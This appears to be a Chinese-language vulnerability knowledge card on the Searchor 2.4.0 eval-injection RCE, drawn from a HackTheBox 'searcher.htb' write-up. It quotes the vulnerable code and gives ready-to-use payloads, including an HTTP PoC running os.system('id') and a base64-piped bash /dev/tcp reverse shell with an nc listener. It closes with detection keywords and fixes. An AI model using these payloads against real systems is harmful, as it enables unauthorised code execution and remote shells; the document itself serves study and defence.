---
id: web-python-searchor-eval-engine-query-import-os-system-rce
title: Searchor 2.4.0 eval 注入：engine/query 拼进 eval 的 search() 调用，闭合单引号后加 __import__('os').system() 即可未授权 RCE（2.4.2 修复）
type: scenario
domain: web
path: web/python
technique: searchor-eval-query-injection-rce
aliases:
- Searchor RCE
- Searchor 2.4.0
- searcher.htb
- eval 注入
- Flask Searchor eval
- __import__ os.system
- Searchor 2.4.2 修复
tags:
- python
- flask
- searchor
- eval
- code-injection
- rce
- ctf
- htb
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Searchor 2.4.0（原文复现版本；2.4.2 修复）
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V682
  verified_at: '2026-11-13T13:44:30+08:00'
  notes: '已对照原文与28图核对：图01 页脚 Powered by Flask and Searchor 2.4.0；图02 v2.4.2 release note ''Patched a priority vulnerability''；图08/11 ffuf 单引号响应 Size 0；图12 11'') # 闭合；图14 print(''xianzhi'') 回显 xianzhi；图15 __import__(''os'').system(''id'') 回显 uid=1000(svc)；图16-18 base64 反弹 shell 成功。affected_versions 按原文 2.4.0 复现、2.4.2 修复。dedup top（pickle/Django eval/PHP eval 等）非同一条利用链。原文图号锚点自 20 起与实际文件偏移一位（实际 20=gitea、21=sudo -l、22=usage、23=docker-ps），不影响卡片事实。未在本环境复现。'
---

## 一句话结论

Searchor 2.4.0 的 `search(engine, query, ...)` 用 `eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")` 执行搜索调用；当 Flask 等 Web 应用把用户提交的 `engine`/`query` 原样传入时，攻击者在 `query` 中闭合单引号并拼接 `+__import__('os').system('id')`、再用 `#` 注释掉剩余代码，即可在无鉴权入口执行任意 Python 代码/系统命令。2.4.2 移除了该 `eval`。

## 原理

- **漏洞代码**：Searchor CLI 的搜索函数（0x01 段源码）：
  ```python
  @click.argument("query")
  def search(engine, query, open, copy):
      try:
          url = eval(
              f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
          )
          url = Engine[engine].search(query, copy_url=copy, open_web=open)
          click.echo(url)
          ...
  ```
  `query` 被直接拼进单引号字符串再交给 `eval`，`engine` 也被拼进属性名位置；两点都可注入。Searchor 2.4.2 的 release note 明确写着 "Patched a priority vulnerability in the Searchor CLI" 并移除了 `eval`。
- **为什么能逃逸成表达式执行**：`eval` 求值的是整个 f-string 拼出来的 Python 表达式。输入 `11') + __import__('os').system('id') #` 后，实际求值变为：
  ```python
  Engine.Accuweather.search('11') + __import__('os').system('id') #', copy_url=False, open_web=False)
  ```
  单引号闭合字符串、`)` 闭合 `search(`，`+` 连接任意表达式，`#` 注释掉原表达式剩余部分；`__import__('os').system('id')` 在求值过程中执行系统命令。
- **Web 入口**：searcher.htb 的首页是一个 Flask 表单，POST `/search`，参数 `engine=Accuweather&query=...`；服务端直接把参数交给 Searchor 2.4.0 的搜索函数，因此未登录即可注入。
- **最小验证与利用**：`query=11')%2bprint('xianzhi')%20%23%20` 返回 `xianzhi` 证明 eval 可控；`query=11')%2b__import__('os').system('id')%20%23%20` 回显 `uid=1000(svc) ...`；再把 system 参数换成 base64 编码的反弹 shell 命令即可 getshell。URL 中 `+` 要编码为 `%2b`，`#` 为 `%23`，空格为 `%20`（或 `+`）。
- **不知道源码时如何发现**：对 `/search` 的 `query` 做特殊字符 fuzz（`ffuf -request searcher.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt`），观察单引号 `'` 是否让响应长度/内容异常（本例 `'` 返回 size 0），再按 Python `print('输入')` 的单引号闭合思路逐步试 `') #`、`')+print(...) #`、`')+__import__(...) #`。

## 触发条件

- 目标使用 Searchor 2.4.0（或包含该 `eval` 实现的版本；2.4.2 修复），且 Web 层把用户可控的 `engine`/`query` 传入 `search()`。
- `/search` 等入口可未授权访问（或攻击者已有低权限账号）。
- 目标 Python 进程允许 `os.system`/子进程执行（无 RASP/沙箱拦截）。
- 返回内容能回显命令输出，或可直接构造反弹 shell（无回显也可盲打）。

## 利用步骤

1. 访问首页确认 "Powered by Flask and Searchor 2.4.0"（或从依赖清单确认版本）。
2. 抓 POST `/search` 请求，确认 `engine`、`query` 参数原样回显/影响结果。
3. 用单引号与注释符探测：`query=11')%20%23%20`，观察是否闭合成功（原查询尾部被注释后不再报错/响应变化）。
4. 执行命令验证：`query=11')%2b__import__('os').system('id')%20%23%20`。
5. 反弹 shell：把 `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'` base64 后作为 `__import__('os').system('echo -n <b64> | base64 -d | bash')` 的参数；本机 `nc -lvnp <port>` 接 shell。

## PoC

```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

engine=Accuweather&query=11')%2b__import__('os').system('id')%20%23%20
```

返回 `uid=1000(svc) gid=1000(svc) groups=1000(svc)`。反弹 shell 变体（原文）：

```text
engine=Accuweather&query=11')%2b__import__('os').system('echo -n <base64反弹shell> | base64 -d | bash')%20%23%20
```

命令回显验证：`query=11')%2bprint('xianzhi')%20%23%20` 返回 `xianzhi`。

## 变体与关联

- **`engine` 参数注入**：`engine` 被拼进 `Engine.{engine}.search(...)` 的属性名位置，可尝试用表达式/`__class__` 链或恒真属性选择配合 `query` 注入；原文使用 `query`。
- **无源码/黑盒发现**：特殊字符 fuzz + 响应差异（size/状态码/回显）定位 eval；按 `print('输入')` 的引号闭合模型构造 payload。
- **其他 eval 拼接库**：任何把参数 f-string 拼进 `eval` 的 Python 库/CLI 都有同类问题；审计关键字 `eval(f"...{user_input}...")`。
- **关联**：`[[web-python-django-login-eval-base64-user-input-rce]]`（Django 登录参数 base64 后 eval）、`[[web-python-class-pollution-execute-method-eval]]`（eval 执行 sink）、`[[web-python-framework-ast-eval-signature-canonicalization-bypass]]`（AST/eval 沙箱绕过）。

## 检测与防御

- **修复**：升级 Searchor 到 2.4.2+（移除 `eval`，改为直接调用 `Engine[engine].search(...)`）。
- **代码层**：禁止把用户输入拼进 `eval`/`exec`；若必须动态调用，使用白名单映射（引擎名 → 方法）与参数化调用。
- **检测**：请求参数中出现 `__import__`、`os.system`、`eval`、`subprocess`、`base64 -d`、闭合引号 + `#` 等特征；响应中出现 `uid=`、命令输出；Flask 异常栈含 `eval` 与 Searchor `search`。
- **加固**：Web 进程最小权限；对 `/search` 的 `engine` 做枚举白名单（如仅允许已知搜索引擎名）；WAF 无法根本防御 eval 注入，必须改代码。
